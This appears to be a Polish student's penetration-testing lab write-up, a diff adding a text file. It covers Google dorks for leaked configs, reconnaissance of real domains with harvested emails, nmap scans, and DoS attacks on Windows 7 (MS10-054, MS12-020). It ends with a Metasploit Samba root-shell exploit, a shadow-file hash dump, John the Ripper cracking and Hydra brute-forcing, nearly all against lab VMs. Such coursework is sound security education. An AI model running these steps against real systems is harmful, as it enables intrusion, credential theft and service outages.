@@ -1,0 +1,314 @@
+Robert Bielas, hasełko: 9724e90f1f17
+================================================================
+OSINT
+przeglądnij różne istniejące zapytania. Spróbuj użyć kilku i zastanów się nad wynikami.
+np. ext:txt | ext:conf | ext:inc | ext:doc intext:php class JConfig - pliki konfiguracyjne wrzucone przez google dorki
+lub inurl:/Divi/Changelog.txt /Divi/Changelog.txt - "juicy info"
+
+"google dorking" lub google hacking może zwrócić informacje które są trudne do odnalezienia
+poprzez proste frazy w przeglądarce. Może zwracać dane osobowe lub hasła, prywatne dokumenty itp.
+
+================================================================
+Przeprowadź rekonesans dla domeny ki.agh.edu.pl za pomocą różnych narzędzi:
+-> przykładowo, wois, kilka pierwszych linijek wyniku:
+DOMAIN NAME:           agh.edu.pl
+registrant type:       organization
+nameservers:           dns.fuw.edu.pl. [193.0.80.11]
+                       nms.cyf-kr.edu.pl. [149.156.1.3]
+                       ns.icm.edu.pl. [212.87.14.39]
+                       ns1.agh.edu.pl. [149.156.96.9]
+                       ns2.agh.edu.pl. [149.156.119.130]
+created:               1995.01.01 12:00:00
+last modified:         2017.05.04 09:58:01
+renewal date:          2017.12.31 13:00:00
+
+
+-> lub dla dnsrecon, żeby wykonać ściągnąć repo, dociągnąć co trzeba przez pip 
+i wykonać python dnsrecon -d ki.agh.edu.pl:
+[*] Performing General Enumeration of Domain: ki.agh.edu.pl
+[*] Checking for Zone Transfer for ki.agh.edu.pl name servers
+[*] Resolving SOA Record
+[+] 	 SOA ns.ki.agh.edu.pl 149.156.100.198
+[*] Resolving NS Records
+[*] NS Servers found:
+[*] 	NS galaxy.uci.agh.edu.pl 149.156.96.9
+[*] 	NS galaxy.uci.agh.edu.pl 2001:6d8:10:1060::6009
+[*] 	NS ns.ki.agh.edu.pl 149.156.100.198
+[*] Removing any duplicate NS server IP Addresses...
+[*]  
+[*] Trying NS server 149.156.100.198
+[+] 149.156.100.198 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-] No answer or RRset not for qname
+[*]  
+[*] Trying NS server 149.156.96.9
+[+] 149.156.96.9 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-] No answer or RRset not for qname
+[*]  
+[*] Trying NS server 2001:6d8:10:1060::6009
+[-] Zone Transfer Failed for 2001:6d8:10:1060::6009!
+[-] Port 53 TCP is being filtered
+[*] Checking for Zone Transfer for ki.agh.edu.pl name servers
+[*] Resolving SOA Record
+[+] 	 SOA ns.ki.agh.edu.pl 149.156.100.198
+[*] Resolving NS Records
+[*] NS Servers found:
+[*] 	NS ns.ki.agh.edu.pl 149.156.100.198
+[*] 	NS galaxy.uci.agh.edu.pl 149.156.96.9
+[*] 	NS galaxy.uci.agh.edu.pl 2001:6d8:10:1060::6009
+[*] Removing any duplicate NS server IP Addresses...
+[*]  
+[*] Trying NS server 149.156.100.198
+[+] 149.156.100.198 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-] No answer or RRset not for qname
+[*]  
+[*] Trying NS server 149.156.96.9
+[+] 149.156.96.9 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-] No answer or RRset not for qname
+[*]  
+[*] Trying NS server 2001:6d8:10:1060::6009
+[-] Zone Transfer Failed for 2001:6d8:10:1060::6009!
+[-] Port 53 TCP is being filtered
+[-] DNSSEC is not configured for ki.agh.edu.pl
+[*] 	 SOA ns.ki.agh.edu.pl 149.156.100.198
+[*] 	 NS galaxy.uci.agh.edu.pl 149.156.96.9
+[*] 	 Bind Version for 149.156.96.9 9.9.10-P2
+[*] 	 NS galaxy.uci.agh.edu.pl 2001:6d8:10:1060::6009
+[*] 	 NS ns.ki.agh.edu.pl 149.156.100.198
+[*] 	 MX smtp.agh.edu.pl 149.156.96.16
+[*] 	 A ki.agh.edu.pl 149.156.97.100
+[*] 	 TXT ki.agh.edu.pl google-site-verification=7uLzlvIrUOzrH6kDvNHpPXjLBvwwL-Zpz8w_foBjcUU
+[*] 	 TXT ki.agh.edu.pl v=spf1 include:_spf.iisg.agh.edu.pl ip4:149.156.100.178 ?ip4:149.156.96.16 ?ip4:149.156.96.35 ?ip6:2001:6d8:10:1060::6023 -all
+[*] Enumerating SRV Records
+[*] 	 SRV _sips._tcp.ki.agh.edu.pl vcs-e.ki.agh.edu.pl 149.156.97.252 5061 1
+[*] 	 SRV _sip._udp.ki.agh.edu.pl vcs-e.ki.agh.edu.pl 149.156.97.252 5060 1
+[*] 	 SRV _sip._tcp.ki.agh.edu.pl vcs-e.ki.agh.edu.pl 149.156.97.252 5060 1
+[*] 	 SRV _h323cs._tcp.ki.agh.edu.pl vcs-e.ki.agh.edu.pl 149.156.97.252 1720 1
+[*] 	 SRV _sip._tls.ki.agh.edu.pl vcs-e.ki.agh.edu.pl 149.156.97.252 5061 1
+[*] 	 SRV _h323ls._udp.ki.agh.edu.pl vcs-e.ki.agh.edu.pl 149.156.97.252 1719 1
+[+] 6 Records Found
+
+-> dig [na dig domain]:
+	id 13688
+	opcode QUERY
+	rcode NOERROR
+	flags QR RD RA
+	;QUESTION
+	ki.agh.edu.pl. IN A
+	;ANSWER
+	ki.agh.edu.pl. 3599 IN A 149.156.97.100
+	;AUTHORITY
+	;ADDITIONAL
+================================================================
+ 1. Wykorzystując theharvester zbierz informacje o wybranej domenie.
+ theharvester -d kali.org -l 500 -b google
+ czyli przeszukaj domenę kali.org, limit wyszukiwania ustawiony na 500, źródło danych: google
+
+ [+] Emails found:
+info-@-kali.org
+muts@kali.org
+steev@kali.org
+marketing@kali.org
+kali-development@list.kali.org
+
+[+] Hosts found in search engines:
+[-] Resolving hostnames IPs... 
+192.99.200.113:Cdimage.kali.org
+192.124.249.10:Docs.kali.org
+192.99.35.23:aphrodite.kali.org
+23.239.31.82:apollo.kali.org
+85.25.43.27:archive-3.kali.org
+149.202.201.51:archive-4.kali.org
+192.99.150.28:archive-5.kali.org
+209.126.116.149:archive-7.kali.org
+192.99.45.140:archive.kali.org
+192.99.200.113:cdimage.kali.org
+192.124.249.10:docs.kali.org
+192.124.249.12:forums.kali.org
+67.23.72.103:git.kali.org
+192.99.200.113:http.kali.org
+199.189.86.7:images.kali.org
+198.27.70.128:old.kali.org
+167.114.101.148:pan.kali.org
+192.95.30.159:repo.kali.org
+192.99.200.113:security.kali.org
+192.124.249.6:tools.kali.org
+50.19.80.43:tracker.kali.org
+192.124.249.10:www.kali.org
+
+2. Wykorzystując CUPP wygeneruj potencjalny słownik haseł dla siebie (podając swoje dane).
+po ściągnięciu repo, wykonaniu komendy python cupp.py -i
+i odpowiedziach na pytania mam słownik, ale haseł nie podam bo było kilka trafów :D
+
+================================================================
+
+Host discovery
+1. Warstwa 2: Znajdź wszystkie hosty lokalne używając komendy nmap i jej parametru -sn. Wykrywanie hostów musi odbywać się za pomocą ARP.
+nmap -v --packet-trace -sn -Pn 172.16.129.0/0
+2. Warstwa 3: Znajdź wszystkie działające w laboratorium hosty (sieć 172.16.129.0/0 lub 172.16.145.0/24) za pomocą komendy nmap i parametru -sn
+nmap -v --unprivileged  -sn 172.16.129.0/0
+nmap -v --unprivileged  -sn 172.16.145.0/24
+
+
+3. Warstwa 4: Znajdź wszystkie hosty lokalne za pomocą komendy nmap:
+UDP Ping na pierwsze 100 portów (-PU)  nmap -v --unprivileged  -sn -Pn -PU1-100 172.16.129.0/0
+TCP ACK Ping na pierwsze 100 portów (-PA): nmap -v --unprivileged  -sn -Pn  -PA1-100 172.16.145.0/24
+================================================================
+1. Przeprowadź UDP scan zeskanuj za pomocą komendy nmap pierwsze 100 portów UDP (-sU) maszyny Metasploitable 2.
+nmap -sU -p 1-100 ip_maszyny
+2. Przeprowadź stealth scan (-sS) za pomocą nmap na pierwsze 100 portów TCP maszyny Metasploitable 2.
+nmap -sS -p 1-100 ip_maszyny
+3.Przeprowadź connect scan (-sT) za pomocą nmap na pierwsze 100 portów TCP maszyny Metasploitable 2.
+nmap -sT -p 1-100 ip_maszyny
+
+4.Przeprowadź idle scan:
+a) Zidentyfikuj hosty, które mają przyrostową sekwencję IPID.
+nmap --script ipidseq  172.16.129.0/0
+b) Przeprowadź idle scan na Metasploitable 2 za pomocą jednego ze znalezionych hostów (-sI). Pamiętaj o tym, żeby unikać jakiejkolwiek interakcji z celem!
+nmap -P0 -p <port> -sI <zombie IP> ip_maszyny
+-sI - scan idle
+
+================================================================
+1. Przeprowadź identyfikację usług (-sV) na pierwszych 100 portach maszyny za pomocą nmap.
+nmap -sV -p 1-100 ip_maszyny
+2. Przeprowadź identyfikację systemu operacyjnego (-O) za pomocą nmap.
+nmap -O ip_maszyny
+3. Przeprowadź identyfikację firewalla (-sA) za pomocą nmap na pierwszych 1000 portach.
+nmap -sA -p 1-1000 ip_maszyny
+
+================================================================
+Sprawdź za pomocą nmap czy maszyna Metasploitable jest podatna na vsFTPd 2.3.4 backdoor (CVE-2011-2523). Wykorzystaj w tym celu jeden ze skryptów NSE (Nmap Script Engine).
+nmap --script ftp-vsftpd-backdoor -p 21 ip_maszyny
+
+Zapoznaj się z opisem i sposobem działania podatności.
+Informacje o tej podatności mają status RESERVED  woficjalnej bazie CVE.
+Jednak z innych źródeł można dowiedzieć się, że exploit opiera się o backdoor dodany do pobieralnego archiwum VSFTPD (vsftpd-2.3.4.tar.gz) - wirus?
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+Uruchom OpenVAS (openvas-start) i otwórz stronę OpenVAS (https://localhost:9392). Skonfiguruj nowy scan dla sieci lokalnej i go uruchom. Przeglądnij rezultaty (zwłaszcza dla Metasplotable 2 i Windows 7).
+
+Wyniki można przeglądać jeszcze w trakcie działania skanera.
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+Proste ataki DoS
+Za pomocą NSE wylistuj wszystkie share’y na maszynie z Windows 7:
+nmap --script smb-enum-shares.nse -p445 win7_ip
+
+Używając gotowego skryptu proof-of-concept z exploitdb 
+przeprowadź atak typu DoS na maszynę z Windows 7 
+wykorzystując lukę Microsoft SMB Server Trans2 Zero
+Size Pool Alloc (MS10-054).
+nmap  -p 445 win7_ip --script=smb-vuln-ms10-054 --script-args unsafe
+
+Zapoznaj się z opisem i sposobem działania podatności: 
+Exploit wykorzystuje niepoprawną obsługę ramek smb, tzn. brak walidacji jej pól. Atakujący może 
+przesłać syntetyczną ramkę SMB aby być w stanie zdalnie wykonać dowolny kod. 
+Oprócz tego mogą pojawić się objawy DoS (np. system się całkowicie zwiesza).
+================================================================
+Używając modułu auxiliary/scanner/discovery/arp_sweep przeprowadź wykrywanie hostów w sieci lokalnej.
+
+1. 
+Najpierw wyświetl informacje o module za pomocą komendy info.
+Ustal, jakie zmienne musisz ustawić: SHOST, SMAC, RHOSTS (dla przyspieszenia: THREADS)
+Wybierz moduł za pomocą komendy use: use auxiliary/scanner/discovery/arp_sweep
+Ustaw zmienne za pomocą serii komend set:
+set SHOST my_mac
+set SMAC my_ip
+set RHOSTS 172.16.129.0-254
+run 
+back 
+
+2.
+Przeprowadź skanowanie portów za pomocą modułów:
+a) auxiliary/scanner/discovery/udp_sweep:
+use auxiliary/scanner/discovery/udp_sweep
+set rhosts 172.16.129.0/24
+run
+back
+
+b) auxiliary/scanner/portscan/syn: (robię dla pierwszych stu portów)
+use auxiliary/scanner/portscan/syn
+set rhosts 172.16.129.0/24
+set ports 1-100
+set threads 10
+run
+back
+
+c) auxiliary/scanner/portscan/tcp:
+use auxiliary/scanner/portscan/tcp
+set rhosts 172.16.129.0/24
+set ports 1-100
+set threads 10
+run
+back
+
+================================================
+
+3.  Sprawdź podatność Windows 7 na błąd MS12-020 (ms12_020_check). Następnie, jeżeli jest podatny, wykorzystaj tę lukę (ms12_020_maxchannelids), aby przeprowadzić atak DoS.
+
+use auxiliary/scanner/rdp/ms12-020_check
+set rhosts ip_maszyny
+exploit 
+back 
+
+Zapoznaj się z opisem i sposobem działania podatności:
+ 
+Bez odpowiedniego patcha maszyna poddana exploitowi doświadcza ataku Denial of Service,
+objawiającym się serią Blue Screen of Death. Exploit działa następująco:
+wykorzystany jest fakt, że różne dystrybucje Windowsa nie przetwarzają poprawnie ramek sieciowych
+w pamięci, co pozwala atakującemu wykonać dowolny kod przesyłając syntetyczną ramkę
+Remote Desktop Protocol, która przetworzona daje dostęp do obiektów które 
+nie zostały poprawnie zainicjalizowane lub zostały usunięte.
+
+================================================================
+Exploit zdalny
+Wykorzystując exploit/multi/samba/usermap_script przeprowadź skuteczną eksploitację Metasploitable (z uzyskaniem shella).
+
+a)Odpalamy intensywne skanowanie nmapem na wirtualce Metasploitable (od 3 do 5 minut) w wirtualce Kali:
+nmap -p 1-65535 -T4 -A -v metaspl_ip 2>&1 | tee /var/tmp/scan.txt
+b)Szukamy demona samby (zazwyczaj port 139 lub 445):
+cd /var/tmp
+grep -i samba /var/tmp/scan.txt
+
+c) wykorzystujemy msfconsole do exploitu demona samby aby uzyskać roota:
+	msfconsole 
+	use exploit/multi/samba/usermap_script
+	set RHOST metaspl_ip
+	exploit 
+	ctrl + Z, yes dla Background session, enter
+	listujemy numer sesji dla następnego kroku: sessions -l
+d) Odczytujemy hashe z pliku /etc/shadow
+	use post/linux/gather/hashdump
+	set session nr_sesji_z_sessions_-l
+	exploit
+	
+	Wypisze się kawałek tekstu. zaznaczamy i kopiujemy fragment za  "Unshadowed Password File"
+	
+e) Używamy John the Ripper żeby złąmać hashe hasła
+	otwieramy nową konsolę w Kali 
+	cd /pentest/passwords/john/
+	./john <skopiowany kawałek tekstu>
+f) Udowadniamy  że exploit zadziałał:
+	cd /root/.msf4/loot
+	ls -lrta
+	
+Zapoznaj się z opisem i sposobem działania podatności: 
+
+Exploit pozwala atakującemu na zdalne wykonanie dowolnego kodu,
+w momencie kiedy jest włączona opcja "username map script" w smb.conf, 
+poprzez metaznaki shella (m. in. funkcja SamrChangePassword, funkcje 
+zdalnej drukarki i file share management).
+
+====================================================
+Na bonus: łamanie haseł hydrą brutem:
+sprawdzamy czy na windowsie istnieje jakaś usługa, załóżmy że jest otwarty port ftp (możemy 
+to sprawdzić w msfconsole poprzez moduł auxiliary/scanner/portscan/syn)
+hydra -L file_with_possible_logins -P file_with_possible_passwords ftp://target_ip
+
+np. jeśli login i hasło na windowsa to odpowiednio robert i robert123, to 
+symulujemy sytuację, że wśród 20 loginów w pliku file_with_possible_logins 
+haseł jest robert, zaś jednym z haseł w pliku file_with_possible_passwords jest robert123 
+
+Efektem powinna być informacja o złamaniu hasła
